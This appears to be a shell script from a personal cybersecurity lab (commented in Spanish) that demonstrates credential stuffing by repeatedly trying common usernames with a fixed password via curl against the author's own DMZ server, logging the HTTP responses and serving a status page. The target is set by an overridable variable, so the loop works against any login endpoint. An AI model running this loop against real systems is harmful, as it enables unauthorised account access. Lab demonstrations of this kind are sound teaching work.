#!/bin/sh
# Modulo 06 - Credential stuffing - DEMOSTRACION CONTROLADA
# Laboratorio de Ciberseguridad de David Santiago Cantor Torres.
# Prueba una lista corta de usuarios con una contrasena fija UNICAMENTE contra
# el servidor DMZ propio (que responde 401, demostrando el rechazo).
set -u

TARGET_URL="${TARGET_URL:-https://servidor-web-dmz-dscantor.onrender.com}"
PORT="${PORT:-8080}"
INTERVALO="${INTERVALO:-60}"
USUARIOS="admin root user docente gestor"
CLAVE="${CLAVE:-password123}"

demo() {
  echo "=============================================================="
  echo "[CREDS] $(date '+%Y-%m-%d %H:%M:%S') Probando credenciales en $TARGET_URL/login"
  for u in $USUARIOS; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -u "$u:$CLAVE" "$TARGET_URL/login")
    echo "[CREDS] $u:$CLAVE -> HTTP $code"
  done
  echo "[CREDS] Prueba completada."
}

( while true; do demo; sleep "$INTERVALO"; done ) &

cat > /app/index.html <<HTML
<!doctype html><meta charset="utf-8"><title>Modulo 06 - Credential stuffing - dscantor</title>
<body style="font-family:Arial;background:#14101a;color:#fff;padding:40px">
<h1>Modulo 06 - Credential stuffing</h1>
<p>Laboratorio de Ciberseguridad de David Santiago Cantor Torres</p>
<p>Prueba de usuarios ($USUARIOS) con clave fija cada $INTERVALO s sobre el DMZ.</p>
<p>Objetivo: $TARGET_URL</p></body>
HTML

cd /app
exec python3 -m http.server "$PORT"
